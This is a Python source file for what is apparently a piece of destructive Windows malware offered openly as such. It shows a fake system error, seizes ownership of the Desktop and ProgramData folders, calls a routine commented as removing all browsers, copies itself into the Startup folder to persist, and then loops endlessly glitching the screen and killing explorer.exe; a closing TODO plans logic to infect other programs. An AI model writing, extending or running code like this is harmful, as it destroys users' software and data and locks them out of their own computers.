from utils.functions import *
from src.HTTPLib import HttpClient
from pathlib import Path

import shutil
import os
import sys

ShowFuckNotification("ERR", "1x000000329: 0x0000000000000000, failed to parse function on table 0x004000003b30031000 and 0x00009B000000491A000")

folder_ownership = getFolderOwner(getDesktopPath())
print("Folder ownership:", folder_ownership)
permissions = getOwnerShip(getDesktopPath())
print("Permissions:", permissions)

folder_path = getDesktopPath()
result = SetOwnership(folder_path)
if result:
    print("Ownership set successfully!")
else:
    print("Error setting ownership.")


default_disk = os.environ['SYSTEMDRIVE']
objects.getAllUnifiedObjectsAndDelete() # Removing all browsers
def REMPROM():
    defaultdiskpath = default_disk + "\\ProgramData\\"
    permissions = getOwnerShip(defaultdiskpath)
    print("Permissions:", permissions)
    folder_ownership = getFolderOwner(defaultdiskpath)
    print("Folder ownership:", folder_ownership)

    result = SetOwnership(defaultdiskpath)
    if result:
        print("Ownership set successfully!")
    else:
        print("Error setting ownership.")


def add_to_startup():
    file_path = os.path.abspath(__file__)
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
    shutil.copy(file_path, startup_folder)


add_to_startup()
REMPROM()

while True:
    makeBuggyScreen()
    os.system("start https://en.wikipedia.org/wiki/Computer_virus")
    os.system("tree /f")
    os.system("cd system32 && taskkill /f /im explorer.exe")


# TODO: Need to implement a logic to infect programs.
